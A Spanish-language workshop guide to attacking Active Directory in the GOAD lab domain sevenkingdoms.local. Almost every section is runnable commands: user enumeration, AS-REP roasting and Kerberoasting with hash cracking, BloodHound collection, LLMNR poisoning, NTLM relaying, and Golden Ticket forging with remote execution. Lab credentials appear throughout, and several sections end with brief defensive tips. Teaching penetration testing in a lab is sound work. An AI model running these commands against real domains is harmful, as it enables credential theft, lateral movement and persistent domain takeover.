# Guía de Ataques en Active Directory

Documento con comandos a ejecutar durante el workshop.

## 1. Fase de Reconocimiento

### 1.1 Escaneo de Red y Servicios
Antes de cualquier ataque, es crucial identificar los servicios expuestos en la red.

```bash
nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23
```

**Explicación:**
- `-Pn`: Ignora la falta de respuesta de ping.
- `-p-`: Escanea todos los puertos.
- `-sC`: Usa scripts de reconocimiento por defecto.
- `-sV`: Identifica versiones de servicios.

Este paso ayuda a identificar servicios clave como SMB, LDAP y Kerberos.

### 1.2 Enumeración de Usuarios
Para descubrir usuarios en el dominio, se pueden utilizar múltiples herramientas:

```bash
netexec smb 192.168.46.10-22 --users
```

También se puede realizar con `rpcclient`:

```bash
rpcclient -U "" -N 192.168.46.11 -c "enumdomusers"
```

Con esto podemos correr el siguiente comando para exportar una lista de usuarios que se encuentran actualmente en Active Directory:
```bash
rpcclient -U "" -N 192.168.46.11 -c "enumdomusers" | cut -d '[' -f 2 | cut -d ']' -f 1 > users.txt
```


---

## 2. Ataques Basados en Kerberos

### 2.1 AS-REP Roasting
Este ataque se dirige a cuentas sin pre-autenticación Kerberos.

```bash
impacket-GetNPUsers north.sevenkingdoms.local/ -usersfile users.txt -dc-ip 192.168.46.11 -format hashcat -output asrephash
```

**Cómo funciona:**
- Busca cuentas con la opción `UF_DONT_REQUIRE_PREAUTH` activada.
- Obtiene un hash AS-REP que puede ser crackeado offline.

Para descifrar el hash:

```bash
hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt -O
```

### 2.2 Kerberoasting
Este ataque abusa de los **Service Principal Names (SPN)** para obtener hashes de contraseñas de cuentas de servicio.

```bash
### Usando el usuario previamente obtenido
impacket-GetUserSPNs -dc-ip 192.168.46.11 -outputfile asrephash -usersfile users.txt 'north.sevenkingdoms.local/samwell.tarly:Heartsbane'

### O con el usuario brandon.stark
impacket-GetUserSPNs -dc-ip 192.168.46.11 -outputfile kerberoasting.hashes -usersfile users.txt 'north.sevenkingdoms.local/brandon.stark:iseedeadpeople'
```

Para crackear el hash:

```bash
hashcat -m 13100 -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt -O
```

**Medidas defensivas:**
- Usar contraseñas largas y complejas en cuentas de servicio.
- Monitorear solicitudes de tickets TGS sospechosas.

---

## 3. Abuso de ACLs y Privilegios

### 3.1 Enumeración con BloodHound
Podemos verificar el acceso del usuario `jon.snow` :
```bash
nxc smb 192.168.46.10-23 -u jon.snow -p 'iknownothing'
```

Corriendo BloodHound Ingestor:
```bash
bloodhound-python --zip -c All -d sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.46.10 -dc sevenkingdoms.local
```

Con el dominio de `north.sevenkingdoms.local`:
```bash
bloodhound-python --zip -c All -d north.sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.46.11 -dc north.sevenkingdoms.local
```

> ***📝Las credenciales de neo4j son "neo4j:testing"***

Abrimos otra consola y usamos el comando:
```bash
sudo neo4j console
```

Ahora, abrimos nuestra instancia de BloodHound desde la carpeta de `WorkShop2025:
```bash
./BloodHound-linux-x64/BloodHound --no-sandbox
```

Queries que podemos correr dentro de BloodHound:
```bash
MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
```

Todos los usuarios de los dominios:
```bash
MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
```

ACL de todos los usuarios:
```bash
MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
```

---
## 4. Ataques de Relaying y Hashes (Solo para ambientes locales, Azure 🔐 no permite este ataque en su ambiente)

### 4.1 LLMNR Poisoning
Este ataque explota la resolución de nombres en la red local para capturar hashes NTLM.

```bash
sudo responder -I <interfaz>
```

Recibiremos un request parecido a esto:
![[ObtainedHash.png]]

Si capturamos un hash NTLMv2, podemos tratar de crackearlos con:

```bash
hashcat -m 5500 --force -a 0 responder.hash /usr/share/wordlists/rockyou.txt
```


**Defensa:**
- Deshabilitar LLMNR y NetBIOS en todas las máquinas.
- Usar SMB Signing para evitar el relaying de NTLM.

### 4.2 NTLM Relay Attack
Este ataque permite redirigir autenticaciones NTLM capturadas hacia otro sistema.

```bash
ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\EDDARD.STARK@192.168.46.22 -smb2support -socks
```

**Defensa:**
- Implementar `LDAP Signing` y `SMB Signing` obligatorios.
- Monitorear autenticaciones NTLM inusuales.

---

## 5. Ataques Persistentes

### 5.1 Golden Ticket Attack
Este ataque permite crear TGTs falsos usando el hash del servicio `KRBTGT`.

```bash
ticketer.py -nthash <krbtgt-hash> -domain-sid <domain-sid> -domain SEVENKINGDOMS.LOCAL robert.baratheon
```

Después de generarlo, lo cargamos con:

```bash
export KRB5CCNAME=/home/kali/Documents/pt/ROBERT.BARATHEON.ccache
```

Finalmente, accedemos a una máquina objetivo:

```bash
wmiexec.py -k -dc-ip 192.168.46.10 -target-ip 192.168.46.10 -no-pass sevenkingdoms.local/robert.baratheon@kingslanding.sevenkingdoms.local
```

**Defensa:**
- Rotar la contraseña del usuario `KRBTGT` regularmente.
- Habilitar `Windows Defender Credential Guard`.
